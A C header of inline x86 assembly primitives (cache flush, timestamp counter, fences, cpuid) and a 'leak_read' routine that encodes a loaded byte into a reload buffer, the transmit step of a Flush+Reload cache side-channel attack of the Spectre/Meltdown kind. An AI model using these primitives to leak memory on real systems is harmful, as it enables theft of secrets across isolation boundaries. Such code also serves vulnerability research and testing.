#pragma once

#include <stdint.h>
static inline __attribute__((always_inline)) void clflush(void *p) {
  asm volatile("clflush (%0)\n" ::"r"(p));
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
  uint64_t lo, hi;
  asm volatile("rdtsc\n" : "=a"(lo), "=d"(hi)::"rcx");
  return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void lfence(void) { asm volatile("lfence\n"); }

static inline __attribute__((always_inline)) void mfence(void) { asm volatile("mfence\n"); }

static inline __attribute__((always_inline)) void maccess(void *ptr) {
  asm volatile("movq (%0), %%rax\n" : : "r"(ptr) : "rax");
}

static inline void cpuid(int code, uint32_t *a, uint32_t *d) {
  asm volatile("cpuid" : "=a"(*a), "=d"(*d) : "0"(code) : "ebx", "ecx");
}

static inline __attribute__((always_inline)) void leak_read(void *leak_buffer, void *reload_buffer) {
  asm volatile(
      // "clflush (%0)\n"
      // "sfence\n"
      "movq (%0), %%rax\n"
      "andq $0xff, %%rax\n"
      "shlq $0xa, %%rax\n"
      "prefetcht0 (%1, %%rax)\n"
      "movq (%1, %%rax), %%rax\n" ::"r"(leak_buffer),
      "r"(reload_buffer)
      : "rax");
}
